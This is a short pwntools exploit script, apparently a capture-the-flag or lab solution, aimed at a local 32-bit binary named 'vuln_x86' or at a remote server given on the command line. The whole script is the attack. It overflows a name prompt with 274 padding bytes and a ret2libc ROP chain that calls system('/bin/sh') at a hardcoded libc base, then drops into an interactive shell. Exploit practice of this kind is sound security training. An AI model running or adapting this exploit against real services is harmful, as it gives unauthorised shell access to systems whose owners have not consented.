from pwn import *

def conn(argv=[], *a , **kw):
	if args.GDB:

		# Debug with GDB
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:

		# ('server', 'port')
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else: 

		# Run local
		return process(exe)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())

exe = './vuln_x86'
io = conn()
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

libc.address = 0xf7d64000


rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))

payload = b'A' * 274 + rop.chain()

io.sendlineafter(b'Hey, whats your name!?\n', payload)
io.sendlineafter(b'is this name correct? (y/n)?\n', b'y\n')

io.interactive()